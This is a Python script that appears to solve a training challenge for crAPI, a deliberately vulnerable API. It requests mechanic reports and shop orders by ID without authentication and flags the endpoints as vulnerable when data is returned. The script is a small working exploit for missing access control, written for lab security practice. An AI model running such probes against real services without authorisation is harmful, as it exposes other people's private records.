#!/usr/bin/env python3
"""Challenge 14: Unauthenticated access to protected endpoints"""
import argparse, sys
from pathlib import Path
from typing import Optional, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def get_mechanic_report_unauthenticated(base_url: str, report_id: int, timeout: float = 15) -> Optional[Dict[str, Any]]:
    try:
        r = requests.get(f"{base_url.rstrip('/')}/workshop/api/mechanic/mechanic_report",
                        params={"report_id": report_id}, timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def get_order_unauthenticated(base_url: str, order_id: int, timeout: float = 15) -> Optional[Dict[str, Any]]:
    try:
        r = requests.get(f"{base_url.rstrip('/')}/workshop/api/shop/orders/{order_id}",
                        timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 14: Unauthenticated Access")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--report-id", type=int, default=1)
    parser.add_argument("--order-id", type=int, default=1)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]

    print(f"[*] Challenge 14: Unauthenticated Access\n[*] Target: {base_url}\n" + "-"*60)

    print(f"\n[*] Testing unauthenticated access to mechanic reports...")
    report = get_mechanic_report_unauthenticated(base_url, args.report_id)
    if report:
        print(f"[+] SUCCESS! Got mechanic report without auth")
        print(f"[+] Report ID {args.report_id}: {report}")
        print(f"[!] VULNERABLE: Can access mechanic reports without authentication")
    else:
        print(f"[!] Mechanic report access denied")

    print(f"\n[*] Testing unauthenticated access to orders...")
    order = get_order_unauthenticated(base_url, args.order_id)
    if order:
        print(f"[+] SUCCESS! Got order without auth")
        print(f"[+] Order ID {args.order_id}: {order}")
        print(f"[!] VULNERABLE: Can access orders without authentication")
    else:
        print(f"[!] Order access denied")

if __name__ == "__main__":
    main()
